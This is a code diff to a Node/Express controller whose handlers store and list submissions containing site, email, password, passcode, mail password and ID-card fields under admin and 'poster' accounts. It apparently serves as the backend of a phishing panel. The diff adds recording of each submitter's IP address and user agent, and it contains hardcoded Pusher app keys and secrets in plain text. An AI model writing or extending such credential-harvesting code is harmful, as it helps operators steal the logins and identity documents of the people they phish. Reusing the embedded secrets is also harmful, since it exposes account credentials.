@@ -24,13 +24,26 @@ export const yoyo = async (req, res) => {
 
 const{id}=req.params
 
-
+// const pusher = new Pusher({
+//     appId: '1710273',
+//     key: 'ff0fc3f0096af6ab8a9045',
+//     secret: '0e0830285b87499f5085',
+//     cluster: 'ap2',
+//     useTLS: true,
+//   })  
+//   || new Pusher({
+//     app_id : "1731286",
+//     key :"a5f0008dea3736f30a1734",
+//     secret : "0599185eb95735d5a17a",
+//     cluster : "ap2",
+//     useTLS: true,
+//   })
     try {
 
-        // const data = await    Info.find().sort({ field: 'asc', _id: -1 }).limit(1)
-        // const data =    await Info.find().sort({$natural:-1}).limit(1);
-        const data = await NewInfo.find()
-        return res.status(200).json({ data: cpuCount})
+
+    const rand =    Math.random().toString().substr(2, 6)
+
+        return res.status(200).json({ data: rand})
 
 
 
@@ -344,24 +357,21 @@ export const poster_add = async (req, res) => {
 
 export const add_data = async (req, res) => {
     const pusher = new Pusher({
-        appId: '1710273',
-        key: 'ff0fc3f0096af6ab8a90',
-        secret: '0e0830285b87499f5085',
-        cluster: 'ap2',
+        app_id : "1731286",
+        key :"a5f0008dea3736f30a17",
+        secret : "0599185eb95735d5a17a",
+        cluster : "ap2",
         useTLS: true,
-      })  
-    //   || new Pusher({
-    //     app_id : "1731286",
-    //     key :"a5f0008dea3736f30a17",
-    //     secret : "0599185eb95735d5a17a",
-    //     cluster : "ap2",
-    //     useTLS: true,
-    //   })
+      })
 
 
     const { adminId, posterId } = req.params
     const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard } = req.body
-
+  const userAgent = req.headers['user-agent'];
+    const ipAddress =  (req.headers['x-forwarded-for'] || 
+    req.connection.remoteAddress || 
+    req.socket.remoteAddress || 
+    req.connection.socket.remoteAddress).split(",")[0];
     try {
         const userFound = await User.findOne({ adminId: adminId })
 
@@ -373,7 +383,9 @@ export const add_data = async (req, res) => {
                 username,passcode,mail,mailPass,adminId:adminId,
                 poster: posterId,
                 root: posterFound._id,
-                onlyCard,holdingCard
+                onlyCard,holdingCard,
+                 ip:ipAddress,
+                agent:userAgent
 
 
             })
@@ -587,7 +599,7 @@ export const poster_details =  (req, res) => {
 
     Poster.findById(id)
     .select('username password posterId links createdAt details')
-    .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
+    .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent createdAt').sort({ createdAt: -1 })
 
     .then(data => {
         return res.status(200).json({ data: data })    }
